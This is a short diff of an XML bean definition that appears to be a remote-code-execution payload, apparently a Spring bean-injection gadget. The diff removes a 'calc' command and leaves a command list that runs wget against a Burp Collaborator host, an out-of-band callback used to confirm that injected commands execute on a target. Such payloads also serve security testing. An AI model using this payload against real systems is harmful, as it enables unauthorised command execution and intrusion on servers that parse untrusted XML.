@@ -4,9 +4,6 @@
             <list>
                 <value>wget</value>
                 <value>https://ii4rdfjxhua0k6kkhkc2dtvaz150tp.burpcollaborator.net</value>
-                <value>
-                    <![CDATA[calc]]>
-                </value>
             </list>
         </constructor-arg>
     </bean>
